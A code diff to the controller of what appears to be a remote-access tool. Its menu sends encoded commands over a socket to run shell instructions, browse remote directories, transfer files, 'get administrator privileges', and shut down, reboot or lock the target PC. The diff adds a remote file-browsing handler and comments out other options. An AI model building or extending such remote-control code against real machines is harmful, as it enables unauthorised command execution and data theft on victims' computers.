@@ -67,13 +67,12 @@ int process(SOCKET clifd)
 	char sendbuf[BUFSIZ] = { 0 };
 	while (true)
 	{
-		cout << endl;
 		cout << "Enter prompt: " << endl;
-		cout << "1.  filebrowse: File browsing" << endl;
+		//cout << "1.  filebrowse: File browsing" << endl;
 		cout << "2.  shell: Execute shell instructions" << endl;
-		cout << "3.  download: File download" << endl;
-		cout << "4.  upload: File upload" << endl;
-		cout << "5.  upright: Get administrator privileges" << endl;
+		//cout << "3.  download: File download" << endl;
+		//cout << "4.  upload: File upload" << endl;
+		//cout << "5.  upright: Get administrator privileges" << endl;
 		cout << "6.  kill: Kill the terminal" << endl;
 		cout << "7.  shutdown: shutdown the pc" << endl;
 		cout << "8.  reboot: Restart the computer" << endl;
@@ -85,17 +84,39 @@ int process(SOCKET clifd)
 		encode(code);
 		send(clifd, code, 50, 0);
 		decode(code);
-		if (strcmp(code, "shell") == 0)
+		if (!strcmp(code, "filebrowse"))
+		{
+			char file[Row] = { 0 };//定义、初始化、输入提示
+			char path[100] = { 0 };
+
+			cout << "please input the path" << endl;
+			cout << "use two '\\'" << endl;
+			cout << "just as 'D:\\\\Games', check the files in Games directory" << endl;
+			cout << "and 'D:\\' check the files under drive D. " << endl;
+
+			rewind(stdin);
+			cin >> path;//输入、加密并发送指令
+			encode(path);
+			send(clifd, path, 100, 0);
+			do
+			{
+				recv(clifd, file, Row, 0);
+				cout << file << endl;
+			} while (file[0] != 0);
+			continue;
+		}
+		else if (strcmp(code, "shell") == 0)
 		{
 			char shell[BUFSIZ] = { 0 };
-			char res[BUFSIZ * 4] = { 0 };
+			char res[BUFSIZ * 6] = { 0 };
 			cout << "Please enter the shell instruction: ";
 			rewind(stdin);
 			cin >> shell;
 			encode(shell);
 			send(clifd, shell, BUFSIZ, 0);
-			if (recv(clifd, res, BUFSIZ * 4, 0) > 0)
+			if (recv(clifd, res, BUFSIZ * 6, 0) > 0)
 			{
+				rewind(stdin);
 				//decode(res);
 				cout << res << endl;
 			}
@@ -103,8 +124,9 @@ int process(SOCKET clifd)
 		}
 		else if (strcmp(code, "kill") == 0)
 		{
-			if (recv(clifd, sendbuf, BUFSIZ, 0) > 0)
+			if (recv(clifd, sendbuf, 60, 0) > 0)
 			{
+				rewind(stdin);
 				decode(sendbuf);
 				cout << sendbuf << endl;
 			}
@@ -113,8 +135,9 @@ int process(SOCKET clifd)
 		}
 		else if (strcmp(code, "reboot") == 0)
 		{
-			if (recv(clifd, sendbuf, BUFSIZ, 0) > 0)
+			if (recv(clifd, sendbuf, 60, 0) > 0)
 			{
+				rewind(stdin);
 				decode(sendbuf);
 				cout << sendbuf << endl;
 			}
@@ -123,8 +146,9 @@ int process(SOCKET clifd)
 		}
 		else if (strcmp(code, "shutdown") == 0)
 		{
-			if (recv(clifd, sendbuf, BUFSIZ, 0) > 0)
+			if (recv(clifd, sendbuf, 60, 0) > 0)
 			{
+				rewind(stdin);
 				decode(sendbuf);
 				cout << sendbuf << endl;
 			}
@@ -133,8 +157,9 @@ int process(SOCKET clifd)
 		}
 		else if (strcmp(code, "lock") == 0)
 		{
-			if (recv(clifd, sendbuf, BUFSIZ, 0) > 0)
+			if (recv(clifd, sendbuf, 60, 0) > 0)
 			{
+				rewind(stdin);
 				decode(sendbuf);
 				cout << sendbuf << endl;
 			}
